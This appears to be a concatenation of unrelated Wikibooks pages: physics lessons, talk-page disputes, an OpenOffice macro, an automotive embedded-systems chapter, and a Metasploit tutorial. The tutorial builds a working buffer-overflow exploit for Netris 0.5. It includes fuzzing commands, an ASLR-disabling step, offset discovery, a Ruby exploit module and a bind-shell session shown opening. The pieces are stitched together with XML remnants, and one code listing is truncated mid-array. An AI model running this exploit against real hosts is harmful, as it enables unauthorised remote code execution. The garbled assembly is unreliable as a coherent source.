&lt;math&gt;2GMrd + GMd^2 = r^2(r^2 + 2rd + d^2) = r^4 + 2r^3d + r^2d^2&lt;/math&gt;

&lt;math&gt;d^2(r^2 - GM) + dr(2r^2 - 2GM) + r^4 = 0&lt;/math&gt;

Using the quadratic formula:

&lt;math&gt; d = \frac{2GMr - 2r^3 \pm \sqrt{r^2(2r^2 - 2GM)^2 - 4r^4(r^2 - GM)}}{2(r^2 - GM)} = \frac{2GMr - 2r^3 \pm \sqrt{4r^6 - 8GMr^4 + 4G^2M^2r^2 - 4r^6 + 4GMr^4}}{2(r^2 - GM)}&lt;/math&gt;

&lt;math&gt;= \frac{2GMr - 2r^3 \pm r\sqrt{4r^4 - 8GMr^2 + 4G^2M^2 - 4r^4 + 4GMr^2}}{2(r^2 - GM)}&lt;/math&gt;

Which is very horrible. If you plug in the numbers, you get:

&lt;math&gt;d = \frac{4.598272 \times 10^21 \pm 4.853341552 \times 10^{21}}{-7.1848 \times 10^{14}}&lt;/math&gt;

Since we want a negative d (because of the minus sign we ignored right at the beginning):

&lt;math&gt;d = \frac{4.598272 \times 10^21 + 4.853341552 \times 10^{21}}{-7.1848 \times 10^{14}} = -13155\mbox{ km}&lt;/math&gt;

Although, I have to confess, there was so much scope for error that it is almost certain that this is the wrong answer. If you fancy wading through and checking, feel free! --[[User:Sjlegg|Sjlegg]] ([[User talk:Sjlegg|talk]]) 14:18, 23 April 2009 (UTC)

== Hi. Can you please stop Kodos from adding tabs ==

I can't believe you guys are allowing hundreds of external links to commercial sites. The tabs are nothing more than a reason to drive traffic to their sites. Look - you've seen me spend three years on the Guitar Book - please respect that and stop this blatant advert rubbish. 

do you know how many hours I've wasted going through that book removing commercial links. 

What can I do - you guys are admin or power users and the edit history shows a lot of you &quot;ok'ing&quot; the additions - don't you care about all the those people who donate (not just rich people but teachers and factory workers and god knows who else). I've deleted all the tabs that are external links - if my cat was flea infested I would buy flea powder - down with these blood sucking parasites who live of the blood of Wikimedia.

[[User:Sluffs|Sluffs]] ([[User talk:Sluffs|discuss]] • [[Special:Contributions/Sluffs|contribs]]) 17:19, 15 September 2013 (UTC)

Sorry about that. A bit of a moan. When I first came on here and Wikipedia I felt out of my depth as far as writing goes. The problem is as I'm improving I am also starting to moan more. Can anyone get better at anything without moaning? I would like to request that the Kodos additions to the Song Library chapters of the Guitar Book be struck out permanently and never restored.

Thanks

Hello, and '''[[Wikibooks:Welcome, newcomers|welcome]]''' to [[Wikibooks]]!

Here are some tips to [[Help|help]] you get started:
* To learn the wiki-markup-language syntax, see [[Help:Editing]].
* Make sure to sign your posts and comments with four tildes, like this: &amp;#126;&amp;#126;&amp;#126;&amp;#126; 
**There is a box at the top of the edit window (if javascript is enabled on your browser) that will insert it too (looks like part of a signature). This will let others know who left it, and make it easy to reply back to you.
* Remember to conduct any editing experiments in the [[Wikibooks:Sandbox|sandbox]].
* You can tell the community something about yourself in your userpage.
** You can get to this page by clicking the tab at the top of the page labeled with your registered username.
* Wikibooks is a collection of open-source textbooks. ([[WB:WIW|What is Wikibooks]]).
* If you are a '''Wikipedian''', see [[Wikibooks:Wikibooks for Wikipedians]] for a primer on how things work here (it's a little different).
** If you want to base your work here on materials from Wikipedia, please use [[WB:RFI]] (requests for importation) to bring the material over in compliance with the GFDL.
* If you're an '''instructor''' and plan on using Wikibooks for a class project, see [[Wikibooks:Guidelines for class projects]]
* Please say hello at the [[Wikibooks:Reading room|Reading Room]] with any questions or ideas.
* Eventually, you might want to read the [[Wikibooks:Manual of Style|Manual of Style]] and [[Wikibooks:Policies and guidelines|Policies and Guidelines]].
** Help us by participating in policy and guideline creation.
** Please take a look at [[Wikibooks:Naming policy]] before starting a new book.
* Remember to maintain a [[Wikibooks:Neutral point of view|Neutral point of view]].
* Explore, [[Wikibooks:Be bold in updating pages|be bold in editing pages]], and have fun!

Should you have written permission from the authors to release them under the stated license, please provide a link to it, or, better yet, upload it to Commons and use the [[meta:OTRS]]. --[[User:Swift|Swift]] ([[User talk:Swift|talk]]) 15:37, 28 April 2009 (UTC)


: It was my understanding that this textbook and all its images are fair game under this clause: &quot;You are granted permission for ... educational ...  reproduction, distribution, display and performance of this work in any format.&quot;  Even so, the textbook authors directly gave permission to my instructor to use any of the textbook material for this project.--[[User:Zatore|Zatore]] ([[User talk:Zatore|talk]]) 15:23, 2 May 2009 (UTC)

:: Then I'm afraid that your understanding was wrong (well, depending on what you mean by &quot;fair game&quot; ... which, as far as I know, is not a legal term). The use of the textbook and images are restricted to non-commercial use. Wikibooks requires material to be uploaded under a license that allows for commercial use. You may wish to look into the Wikibooks' licensing. See [[Wikibooks:Copyrights]] and [[Wikibooks:Media]].
:: Please contact the authors and ask them to re- or multi-license the material under a license which is compatible with Wikibooks' requirements. If they are interested in making the contents &quot;fair game&quot; in the sense that they are free for anyone to do as they like, then suggest that they release these into the public domain and upload them to [[commons:Wikimedia Commons]] and use the [[meta:OTRS]] to confirm their licensing.
:: Hope that helped. --[[User:Swift|Swift]] ([[User talk:Swift|talk]]) 00:25, 5 May 2009 (UTC)</text>

      <comment>/* On to the Framework */</comment>
      <text xml:space="preserve">{{MSFTOC}}

== Introduction ==

In this tutorial, I will show you how to create an exploit module for the Metasploit Framework starting from a vulnerability report.

== The Vulnerability ==
The program I chose to exploit is Netris 0.5. I chose this because it's vulnerability is a simple buffer overflow, it is remote, and there is already a working exploit out there that we can use as a starting point. You can reference this vulnerability [http://www.securityfocus.com/bid/5680 here]. Note that this vulnerability applies only to version 0.5.

== Getting Started ==
First off, get the source for Netris 0.5. You can get it [ftp://ftp.netris.org/pub/netris/ here]. Compile it, and make sure it runs without error.

The released exploit for this explains that our buffer should look like this: 

 [68 filler bytes][nops][shellcode][return address]

However, lets begin with something a little more simple. Let's see what happens when we send a whole bunch of &quot;A&quot;s at the Netris server.

In one shell: 

 $ gdb netris

Now you are in gdb and ready to run Netris. From the gdb prompt, start the server:

 (gdb) run -w

Now, in another shell: 

  $ ruby -e 'print &quot;A&quot;*16000'| nc localhost 9284

You may need to ctrl+c out of netcat, but when that is done, take a look at your gdb session. It should look like this:

  Program received signal SIGSEGV, Segmentation fault.
  0x41414141 in ?? ()

This is prefect. What this shows is that we just overwrote the instruction pointer ($eip) to 0x41414141, which is hex for AAAA.

Since we can control the instruction pointer, we can control the flow of this program. From here on out, you may need to set your kernel to not use randomized virtual addressing. You can do this with sysctrl using the following command:

  $ sudo sysctl -w kernel.randomize_va_space=0

This is so the buffer will be stored in relatively the same place each time, allowing us to return into it.

== On to the Framework ==
First, start out with a relatively generic exploit script. You can just copy one of the Linux exploits under modules/exploits/linux to get started.

&lt;syntaxhighlight lang=&quot;ruby&quot;&gt;
  require 'msf/core'
  class Metasploit3 &lt; Msf::Exploit::Remote
      include Exploit::Remote::Tcp
      def initialize(info = {})
          super(update_info(info,
              'Name'           =&gt; 'Netris 0.5 Buffer Overflow (Linux)',
              'Description'    =&gt; %q{
                        Netris 0.5 exploit.  
                  Discovery of this issue is credited to Artur Byszko / bajkero.    
              },
              'Version'     =&gt; '0.1.0',
              'Author'         =&gt; ['dougsko'],
              'License'        =&gt; GPL_LICENSE,
              'References'     =&gt;
                  [
                      [ 'BID', '5680'], 
                      [ 'CVE', '2002-1566' ],
                      [ 'URL', 'http://securityvulns.com/files/netrisx.c' ],
                      [ 'URL', 'http://xforce.iss.net/xforce/xfdb/10081' ],
                  ],
              'Privileged'     =&gt; false,
              'Payload'     =&gt;
                  {
                      'Space' =&gt; 1024,
  
                  },
              'Platform'    =&gt; ['linux'],
              'Targets'    =&gt;
                  [
                      [ 'Ubuntu 8.04',
                          { 'Ret'        =&gt; 0x80522b0,
                            'Arch'    =&gt; [ARCH_X86 ],
                            'BufSize'    =&gt; 9692,
                          }
                      ],        
                  ],
              'DisclosureDate' =&gt; '08/14/2003',
              'DefaultTarget'  =&gt; 0 ))
              register_options( [ Opt::RPORT(9284) ], self.class)
      end
      def exploit
      end
  end
&lt;/syntaxhighlight&gt;

Notice that I have already filled in some of the specific information about this exploit. The next big piece of info that we need is the return address. We need an address that will point back to somewhere within our buffer. Finding this address can be a little tricky, but here's how I did it: 

* Run Netris in gdb.
* Overflow it with a bunch of &quot;A&quot;s. 
* Take a look at the netBuf function, since this is near where the overflow is happening. (You did read the vulnerability notes right...?)

  (gdb) x/20s netBuf
  0x8052260 &lt;netBuf&gt;:      'A' &lt;repeats 64 times&gt;
  0x80522a1 &lt;netBufSize+1&gt;:        &quot;&quot;
  0x80522a2 &lt;netBufSize+2&gt;:        &quot;&quot;
  0x80522a3 &lt;netBufSize+3&gt;:        &quot;&quot;
  0x80522a4 &lt;isServer&gt;:    'A' &lt;repeats 200 times&gt;...
  0x805236c:       'A' &lt;repeats 200 times&gt;...
  0x8052434 &lt;opponentHost+116&gt;:    'A' &lt;repeats 200 times&gt;...
  0x80524fc &lt;scratch+28&gt;:  'A' &lt;repeats 200 times&gt;...
  0x80525c4 &lt;scratch+228&gt;:         'A' &lt;repeats 200 times&gt;...
  0x805268c &lt;scratch+428&gt;:         'A' &lt;repeats 200 times&gt;...
  0x8052754 &lt;scratch+628&gt;:         'A' &lt;repeats 200 times&gt;...
  0x805281c &lt;scratch+828&gt;:         'A' &lt;repeats 200 times&gt;...
  0x80528e4 &lt;curShape&gt;:    'A' &lt;repeats 200 times&gt;...
  0x80529ac:       'A' &lt;repeats 200 times&gt;...
  0x8052a74:       'A' &lt;repeats 200 times&gt;...
  0x8052b3c:       'A' &lt;repeats 200 times&gt;...
  0x8052c04:       'A' &lt;repeats 200 times&gt;...
  0x8052ccc:       'A' &lt;repeats 200 times&gt;...
  0x8052d94:       'A' &lt;repeats 200 times&gt;...
  0x8052e5c:       'A' &lt;repeats 200 times&gt;...

Notice that after 0x80529ac, memory is basically filled with our A's. I just picked a random address somewhere after that and used 0x80522b0. This is OK, since we'll be using a large NOP sled we won't have to be very accurate when it comes to the return address. The next step is to find out just how long our buffer needs to be in order to overflow the buffer, but still overwrite the EIP register properly with out return address.

To do this, we'll use the scripts patter_create.rb, and pattern_offset.rb under the tools folder. First, start up Netris in gdb again:

  $ gdb netris
  (gdb) run -w

In another shell use the pattern_create.rb script to create your overflow string:

  ./pattern_create.rb 16000 | nc localhost 9284 

This will cause an overflow:

  Program received signal SIGSEGV, Segmentation fault.
  0x316c4d30 in ?? ()

Now, we see that the EIP has been overwritten with 0x316c4d30, which is the pattern of letters that we sent to the server. To find just how big of a buffer it took to do this, we use pattern_offset.rb:

  ./pattern_offset.rb 0x316c4d30 16000 
  9692

We see that our buffer size should be 9692 bytes long. Put that into the target definition in our exploit module. We are now ready to get down to business.

== Taking Over ==

All we have to do now is define our exploit method in the module we are writing.

&lt;syntaxhighlight lang=&quot;ruby&quot;&gt;
  def exploit
    print_status(&quot;Generating buffer&quot;)
    buf = make_nops(target['BufSize'] - payload.encoded.length) + payload.encoded + [target.ret].pack('V')        
    print_status(&quot;Sending \#{buf.size} byte buffer...&quot;)
    connect
    sock.put(buf)
    sock.get
    handler
    disconnect
  end
&lt;/syntaxhighlight&gt;

This sets up our attack buffer like so:

  [NOPs][shellcode][return address] total: 9692 bytes

Then, we send it out with sock.put(buf). The framework really takes care of most of the other details involved, including shellcode generation. Here is what my final exploit module looks like: 

&lt;syntaxhighlight lang=&quot;ruby&quot;&gt;
  require 'msf/core'

  class Metasploit3 &lt; Msf::Exploit::Remote

      include Exploit::Remote::Tcp

      def initialize(info = {})
          super(update_info(info,
              'Name'           =&gt; 'Netris 0.5 Buffer Overflow (Linux)',
              'Description'    =&gt; %q{
                        Netris 0.5 exploit.  
                  Discovery of this issue is credited to Artur Byszko / bajkero.    
              },
              'Version'     =&gt; '0.1.0',
              'Author'         =&gt; ['dougsko'],
              'License'        =&gt; GPL_LICENSE,
              'References'     =&gt;
                  [
                      [ 'BID', '5680'], 
                      [ 'CVE', '2002-1566' ],
                      [ 'URL', 'http://securityvulns.com/files/netrisx.c' ],

              'Privileged'     =&gt; false,

Make a folder called mine under modules/exploits/, and put that file in it. Here is what it looks like when you run the exploit. Note that I am running the Netris server as user doug.

  ./msfcli mine/netris rhost=localhost target=2 payload=linux/x86/shell_bind_tcp E

  [*] Started bind handler
  [*] Generating buffer
  [*] Sending 9696 byte buffer...
  [*] Command shell session 1 opened (127.0.0.1:36044 -&gt; 127.0.0.1:4444)

  id
  uid=1000(doug) gid=1000(doug), groups=4(adm),20(dialout),24(cdrom) ...etc

== Wrap it up ==
So that's it. We just went from vulnerability report to a working exploit. I seem to have the best luck using the linux/x86/shell_bind_tcp payload. Have fun!</text>

      <text xml:space="preserve">If you want to perform a repetitive task, doing this automatically using a macro is the way to go. A macro is a series of instructions for the computer to perform. Macros are widely used by professionals and expert users in Microsoft Office. OpenOffice.org can also perform macros. OpenOffice.org can be scripted through OpenOffice.org Basic (the easiest and most common language), Python, Beanshell, and Javascript, this feature is more widely known as Macro.

 | style=&quot;border:1px solid; padding:1em; padding-top:0em; background:#f0f0ff; width:50%;&quot; |Imagine you have twelve spreadsheets which need your name as a page footer, the top row made bold and the fourth column highlighting in red. How would you do this without going through each one individually? The answer is record a macro.
|}
A simple macro called Main to zoom out to 75% in OpenOffice.org Basic looks like this.
&lt;source lang=basic4gl&gt;
sub Main
rem ----------------------------------------------------------------------
rem define variables
dim document   as object
dim dispatcher as object
rem ----------------------------------------------------------------------
rem get access to the document
document   = ThisComponent.CurrentController.Frame
dispatcher = createUnoService(&quot;com.sun.star.frame.DispatchHelper&quot;)

rem ----------------------------------------------------------------------
dim args1(2) as new com.sun.star.beans.PropertyValue
args1(0).Name = &quot;Zoom.Value&quot;
args1(0).Value = 75
args1(1).Name = &quot;Zoom.ValueSet&quot;
args1(1).Value = 28703
args1(2).Name = &quot;Zoom.Type&quot;
args1(2).Value = 0

dispatcher.executeDispatch(document, &quot;.uno:Zoom&quot;, &quot;&quot;, 0, args1())


end sub
&lt;/source&gt;

      <comment>Changed 'voltage increases' to 'energy stored increases'.</comment>
      <text xml:space="preserve">[[Image:Tantalum_capacitor.JPG|thumb|right|A 10 &amp;mu;F capacitor]]
If you place two conducting plates near each other, with an insulator (known as a dielectric) in between, and you charge one plate positively and the other negatively, there will be a uniform electric field between them. Since:

&lt;math&gt;E = \frac{V}{d}&lt;/math&gt;, 

as the distance between the two plates decreases, the energy stored increases. This system is known as a capacitor - it has a capacitance for storing charge. The capacitance C of a capacitor is:

&lt;math&gt;C = \frac{Q}{V}&lt;/math&gt;,

where Q is the charge stored by the capacitor, and V is the potential difference between the plates. C is therefore the amount of charge stored on the capacitor per unit potential difference. Capacitance is measured in farads (F). Just as 1 coulomb is a massive amount of charge, a 1F capacitor stores a lot of charge per. volt.

Any capacitor, unless it is physically altered, has a constant capacitance. If it is left uncharged, Q = 0, and so the potential difference across it is 0. If a DC power source is connected to the capacitor, we create a voltage across the capacitor, causing electrons to move around the circuit. This creates a charge on the capacitor equal to CV. If we then disconnect the power source, the charge remains there since it has nowhere to go. The potential difference across the capacitor causes the charge to 'want' to cross the dielectric, creating a spark. However, until the voltage between the plates reaches a certain level (the breakdown voltage of the capacitor), it cannot do this. So, the charge is stored.

If charge is stored, it can also be released by reconnecting the circuit. If we were to connect a wire of negligible resistance to both ends of the capacitor, all the charge would flow back to where it came from, and so the charge on the capacitor would again, almost instantaneously, be 0. If, however, we put a resistor (or another component with a resistance) in series with the capacitor, the flow of charge (current) is slowed, and so the charge on the capacitor does not become 0 instantly. Instead, we can use the charge to power a component, such as a camera flash.

==Exponential Decay==
Current is the rate of flow of charge. However, current is given by the formula:

&lt;math&gt;I = \frac{V}{R}&lt;/math&gt;

But, in a capacitor, the voltage depends on the amount of charge left in the capacitor, and so the current is a function of the charge left on the capacitor. The rate of change of charge depends on the value of the charge itself. And so, we should expect to find an exponential relationship:

&lt;math&gt;Q = Q_0e^{-\frac{t}{RC}}&lt;/math&gt;,

where R is the resistance of the resistor in series with the capacitor, Q is the charge on the capacitor at a time t and Q&lt;sub&gt;0&lt;/sub&gt; was the charge on the capacitor at t = 0. Since Q = I&amp;Delta;t:

&lt;math&gt;I\Delta t = I_0\Delta te^{-\frac{t}{RC}}&lt;/math&gt;

&lt;math&gt;I = I_0e^{-\frac{t}{RC}}&lt;/math&gt;,

where I is the current flowing at a time t and I&lt;sub&gt;0&lt;/sub&gt; was the initial current flowing at t = 0. Since V = IR:

&lt;math&gt;V = V_0e^{-\frac{t}{RC}}&lt;/math&gt;

The power being dissipated across the resitors in the circuit is IV, so:

&lt;math&gt;P = I_0V_0e^{-\frac{t}{RC}}e^{-\frac{t}{RC}} = P_0e^{-\frac{2t}{RC}}&lt;/math&gt;

==Energy==
The energy stored by a capacitor E is defined as:

&lt;math&gt;E = \int^V_0 Q \; dV&lt;/math&gt;

In other words, it is the area under a graph of charge against potential difference. Charge is proportional to potential difference (Q = CV), so the area under the graph is that of a triangle with base V and height Q. You can show this mathematically:

&lt;math&gt;E =  \int^V_0 CV \; dV = C\left [\frac{V^2}{2}\right ]^V_0 = \frac{1}{2}CV^2&lt;/math&gt;

Since Q = CV:

&lt;math&gt;E = \frac{1}{2}QV&lt;/math&gt;

==Circuits==
The circuit symbol for a capacitor is [[Image:Capacitor_Symbol_alternative.svg|20px]]. A simple circuit with a capacitor in series with a resistor, an ideal ammeter (no resistance), and in parallel with an ideal voltmeter (infinite resistance) looks like the following:

[[Image:Capacitor_resistor_series.svg|400px]]

In the position shown, the capacitor is charging. If the switch were put in the other position, the capacitor would be discharging exponentially through the resistor. In this circuit, the capacitor charges instantly since there is no resistance to slow it down. In reality there will be internal resistance in the battery, meaning that the capacitor charges exponentially.

If capacitors are placed in parallel, they act as one capacitor with a capacitance equal to the total of all the capacitances of all the individual capacitors. If capacitors are placed in series, the distances between the plates in each of them result in the capacitance of the imaginary resultant capacitor &amp;Sigma;C being given by:

&lt;math&gt;\frac{1}{\Sigma C} = \frac{1}{C_1} + \frac{1}{C_2} + ... + \frac{1}{C_n}&lt;/math&gt;

==Questions==

1. A 2 mF capacitor is connected to a 10V DC power supply. How much charge can be stored by the capacitor?

2. What is the highest possible energy stored by this capacitor?

3. The capacitor is placed in series with a 5&amp;Omega; resistor and charged to capacity. How long would it take for the charge in the capacitor to be reduced to 1 mC?

4. After this time has elapsed, how much energy is stored in the capacitor?

5. What is the capacitance of the equivalent capacitor to the following network of capacitors?

      <text xml:space="preserve">'''1. A 2 mF capacitor is connected to a 10V DC power supply. How much charge can be stored by the capacitor?'''

&lt;math&gt;Q = CV = 2 \times 10^{-3} \times 10 = 0.02\mbox{ C}&lt;/math&gt;

Note that this is the maximum charge - since capacitors charge, as well as discharge, exponentially, we would have to leave the capacitor charging for an infinitely long period of time to charge it to capacity.

'''2. What is the highest possible energy stored by this capacitor?'''

&lt;math&gt;E = \frac{1}{2}QV = 0.5 \times 0.02 \times 10 = 0.1\mbox{ J}&lt;/math&gt;

'''3. The capacitor is placed in series with a 5&amp;Omega; resistor and charged to capacity. How long would it take for the charge in the capacitor to be reduced to 1 mC?'''

&lt;math&gt;Q = Q_0e^{-\frac{t}{RC}}&lt;/math&gt;

&lt;math&gt;Q_0 = Qe^{\frac{t}{RC}}&lt;/math&gt;

&lt;math&gt;e^{\frac{t}{RC}} = \frac{Q_0}{Q}&lt;/math&gt;

&lt;math&gt;\frac{t}{RC} = \ln{\frac{Q_0}{Q}}&lt;/math&gt;

&lt;math&gt;t = RC\ln{\frac{Q_0}{Q}} = 5 \times 0.002 \times \ln{\frac{0.02}{0.001}} = 0.0300\mbox{ s}&lt;/math&gt;

'''4. After this time has elapsed, how much energy is stored in the capacitor?'''

&lt;math&gt;E = \frac{1}{2}QV = \frac{1}{2}Q_0V_0e^{-\frac{2t}{RC}} = 0.5 \times 0.02 \times 10 \times e^{-\frac{2 \times 0.03}{5 \times 0.002}} = 2.5\;m\mbox{J}&lt;/math&gt;

[[Image:Capacitor_network.svg|300px|thumb|right]]
'''5. What is the capacitance of the equivalent capacitor to the following network of capacitors?'''

First, ignore the fact that the capacitances are in mF, not F - we will not be using any other units, so if we put in mF, we will get out mF.

Then work out the equivalent capacitance of the second row:

&lt;math&gt;\frac{1}{\Sigma C_2} = \frac{1}{1} + \frac{1}{2} + \frac{1}{3} = \frac{11}{6}&lt;/math&gt;

&lt;math&gt;\Sigma C_2 = \frac{6}{11}\mbox{ mF}&lt;/math&gt;

Then work out the equivalent capacitance of the third row:

&lt;math&gt;\frac{1}{\Sigma C_3} = \frac{1}{2} + \frac{1}{2} = 1&lt;/math&gt;

&lt;math&gt;\Sigma C_3 = 1\mbox{ mF}&lt;/math&gt;

The equivalent capacitance of the first row is easy, since it contains just 1 capacitor: 3mF. So, the total equivalent capacitance is:

&lt;math&gt;\Sigma C = 3 + \frac{6}{11} + 1 = \frac{50}{11} \approx 4.55\mbox{ mF}&lt;/math&gt;

This Application chapter discusses the embedded systems of '''modern automobiles''', including trucks and busses.  Most attention is given to the engine control unit, however several other vehicle parts and their embedded systems are also handled.
To finish, a short case study of the airbag controle module of a [[w:Toyota Prius|Toyota Prius]] is given.

== Overview of embedded systems in an automobile ==

'''This is the old automotive section, wich we though wasn't very enlightening, so we pretty much changed it all. If someone would feel the urge to adapt the automotive section again, inspiration could be found here. '''


Embedded systems in a car are situated in four major areas: the ''driving control system'', the ''body control system'', the ''driving information system'' and the ''in-vehicle LAN''.
The driving control system part will mainly focus on the engine control unit but also discusses electronic stability control and electric power steering.
The body control system considers dashboard meters, control switches, power windows, intelligent keys, adaptive front lighting system, tire pressure monitoring, automatic wipers and central monitoring.
The driving information system will review the car navigation system, wave radar and night vision.
Finally a short word will be said about the in-vehicle LAN.

=== Driving control system ===

==== Engine control ====
{{wikipedia| Otto cycle}}
Gasoline engines are based on the Otto cycle. Basically a mixture of [[wikipedia: fuel | fuel]] and air is ignited and part of the released energy is translated into mechanical energy to make the car move via the drive line. 
The power and pollutants which result from this process are greatly affected by how precisely the fuel/air mixture approached theoretical perfection and when the ignition event took place. To get clean air, fuel had to be precisely mixed in a &quot;stoichiometric&quot; 14.7:1 ratio. The mixture had to be ignited at a precise instant that varied with load, speed, and other factors (http://www.intel.com/design/auto/engback.htm).

The introduction of [[wikipedia: Engine control unit| Electronic engine control units]] gave the required flexibility for a good metering of the fuel and a precise ignition timing on the whole range of the engine. They can also control other aspects of the internal combustion process such as [[wikipedia: Variable Valve Timing | variable valve timing]].

The ECU was the first embedded system used in  a standard automobile and remains the most important one.  This section discusses some of the important aspects of such a controller and how they relate to the general theory of [[Embedded Control Systems Design | embedded control systems design]].

===== Conditions for a good ECU =====

A good ECU must possess a number of qualities

*The timing of the injections has to be as precise as possible, this implies real-time operation.
*The ECU has to interface with a number of sensors which monitor the combustion process.
*The ECU must be sufficiently powerful to process all the signals and control commands in a real-time matter.
*The ECU must be sufficiently robust to maintain a long lifetime while being subject to the high temperatures, vibrations and electromagnetic noise generated by other components in the car.
*The weight of the ECU and all of it’s related components has to be as low as possible. 
*The price of the system had to be as low as possible to be mounted on passenger cars.
*The ECU must have a safe failure mode to avoid damaging the engine or causing an unsafe situation.
*The ECU must be able to communicate with other components of the car 
*The ECU has to provide On Board Diagnosis interface 


===== Structure of an ECU =====

*Processor :

The heart of  an ECU is of course it’s processor. Usually the processor is a microcontroller.  These can be produced cheaply in large quantities . The fact that they are hard(er) to reprogram is not an issue since they are meant to run the same program throughout their entire lifetime. A typical processor in an ECU is at least a 16-bit processor working  at 24Mhz. Usually an ECU also has some flash memory for data logging and a couple of K RAM to handle the parameters when computing. High Performance applications demands for ECUs are too high to be handled by a single microcontroller. More complex embedded CPUs are then often used. Sometimes multi-processor solutions are used, for example in the McLaren TAG-210 (http://www.mclarenelectronics.com/).  An alternative is the use of smart sensors (http://electronics.howstuffworks.com/car-computer5.htm), which do part of the signal processing themselves and thus lessen the load on the main ECU processor.

*Software :
Due to the repetitive character of the tasks, the ECU does not need an operating system. The software which is directly burnt on the memory is usually not made publicly available by the manufacturers.

The working principle of the software is as follows :

Volumetric Efficiency (VE) table which give the filling of the cylinder is set in function of the pressure in the manifold and the engine speed.
Using the signals of the sensors (air temperature and pressure) and the VE table, the mass of air in the cylinder can be computed by the perfect gas law.
The requested fuel quantity is computed as the product of the air mass with the air fuel ratio.
Corrections are made in function of the temperature, throttle opening speed, atmospheric pressure, EGR,...
The final fuel quantity is translated into an opening time of the injector or a Pulse Width (PW).
The PW is translated to electric signal which is send to the injectors.

This part of the control system is a full feed forward regulation.

A closed loop regulation with Exhaust Gas Oxygen sensor (EGO) correction is added to the process. This regulation works only in normal working conditions (not idling or Wide Open Throttle). The ECU checks the value of the lambda sensor and adjust the fuel quantity. 

*Converters and buses : 

The ECU controls amongst other things, the release of fuel in the combustion chamber (injection timing) and  the actual ignition (ignition timing)  
The sensors and actuators usually use analog signals as input and output. A microprocessor, of course, operates using digital signals. This is why a ECU contains a large number of A/D and D/A converters.  Smart sensors (http://electronics.howstuffworks.com/car-computer5.htm already  do part of the signal processing themselves and can thus send digital signals instead of analog ones. These are less susceptible to electrical noise.  
The (digital) communication between different parts of the ECU or between the ECU and the rest of the car usually happens according to the [[Embedded Control Systems Design/Field busses | CAN protocol ]].

*Casing :

Because the ECU has to last a long time the microprocessor is usually shielded by a special box. This box protects the processor from harmful influences from the environment such as excessive heat, humidity, vibrations or electrical noise.

===== Sensors =====

An ECU needs to continuously monitor the combustion process. Therefore it uses a wide array of sensors. A non-exhaustive list of these is given bellow :

* Manifold Absolute Pressure sensor : Piezoresistive sensor 
* Throttle Position Sensor (TPS) : rotational potentiometer 
* Crankshaft position sensor : electromagnetic sensor
* Camshaft position sensor : electromagnetic sensor
* Air temperature sensor : NTC thermistor
* Coolant temperature sensor : NTC thermistor
* EGO sensor : wide band warm oxygen sensor (aka Lambda sensor) 

Most of the sensors output analogue signals varying between 0 and 5 V DC.

===== Actuators =====

Actuators are here the injectors. They work with a piezoelectric actuator or solenoid which opens the injector  under 12V voltage.
 
These are rated by the fuel flow they can deliver. This parameter is given in cc/Min @ full opening.
The choice of injector is specific to each engine and it's application.

Once the requested fuel quantity is computed by the ECU, it can be easily converted in injector's opening time. This opening time theoretical equal to time that the injector must be feed with 12V or the pulse width.
Deviations from the theory occurs due to the finite time needed to fully open the injector and the battery voltage variation.
Those two facts must also be taken into account.

Injectors can be have low or high impedance. So in order to work with low impedance injectors, the current must limited. This can done by adding resistor or reducing the current electronically with a Pulse Width Modulation (PWM).
If the injector is very quickly set alternatively to 12V and ground the total amount of current in the injector will decrease.

===== More Information: =====

Megasquirt ( [[Wikipedia: MegaSquirt]] )
( http://www.megasquirt.info/ ) is an open source ECU for educational purposes.

Howstuffworks http://electronics.howstuffworks.com/car-computer.htm has a good article explaining the basic construction and functions of an ECU. 

===== Manufacturers: =====

* Bosch
* Magneti-Marelli
* Siemens

==== Electronic stability control (ESC) ====

When dangerous driving conditions occur, for instance driving on a wet or slippy road or turning, electronic stability control helps the driver to master the car.  Therefore the ESC uses systems like ABS and traction control.  Traction control prevents the tires from slipping by controlling engine power and/or braking.

==== Electric power steering ====

Depending on the angle of the steering wheel and the exerted torque, the microcontroller of the electric power steering system determines how much power the assist motor must give.

=== Body control system ===

==== Dashboard meters ====

Contrary to older cars where dashboard meters were all mechanically driven, the dasboard meters found in newer cars are all precisely driven by electric motors controlled by an instrumentation controller.

==== Control switches ====

On the dashboard and around the steering wheel, more and more switches (telephone, navigation system, car audio system…) tend to appear.  In order to avoid having on wire per switch, manufacturers came up with the ‘LIN’ or ‘local interconnect network’.  

==== Power windows ====

Almost all cars today get equipped with power windows.  A control system is needed to give them an ‘auto shut down’ function, to avoid accidents with children.

==== Intelligent keys ====

All car keys today are able to automatically open the doors without having to manually insert the key into the door.  Some keys even are able to start the engine.  These functions ask for wireless command signals together with radio transmitters, receivers and antenna’s built into the door.  Of course the signal must be coded to avoid burglary.  This task is accomplished by a microcontroller chip.

==== Adaptive front lighting system ====

When making a turn by night on a badly illuminated road, a microcontroller turns one of the headlights according to the speed of the car and turning angle.  This way the driver can see further.

==== Tire pressure monitoring ====

Tire pressure must be kept at the right level.  Suboptimal pressure increases fuel consumption and tire wear.  Therefore a microcontroller communicates wirelessly with sensors sensing the pressure in every tire.  When tire pressure is too low, the driver can be alerted.

==== Automatic wipers ====

To make sure the driver needs not to worry about turning on or off the wiping system or decide how fast the wipers should go there and back, a microcontroller equipped with an optical system is used.  A sensor detecting the reflection of LED light being irradiated on the windscreen detects whether or not rain is on the windscreen and how much.

==== Central monitoring ====

The central monitor or computer constantly informs the driver about the vehicle condition.  Examples are the detection of a broken lamp, low battery voltage or the average fuel consumption.

=== Driving information system ===

==== Car navigation system ====

The navigation system has evolved from a simple electronic route map display to a multimedia console.  Car manufacturers expect the navigation system to gradually become even more sophisticated, for instance by using 3D road maps instead of 2D.

==== Wave radar ====

The wave radar’s task consists of determining following distances and relative vehicle speeds.  In an event of possible crash, it also must activate the brakes.

==== Night vision ====

When driving by night, people walking over the road may be difficult to see.  The night vision consists of an infrared camera attached to the front of the car, sending images to a control system able to detect persons or moving objects.  These can then be projected on the windscreen to warn the driver.

== In vehicle LAN ==

The number of controllers and sensors in an automobile will keep growing.  In order to reduce the complexity of communication and therefore the number of wires, an in-vehicle network was engineered, the most well-known being the CAN protocol.

= Case study: ACM of the Toyota Prius =

The Toyota Prius is a popular hybrid vehicle.  Due to the use of a conventional internal combustion engine combined with electric motors it achieves very low fuel consumption.
A complete teardown of the car is carried out at http://www.techonline.com/product/underthehood/199100168.
In this section only the airbag control module (ACM) is shortly reviewed.

== The airbag control module ==

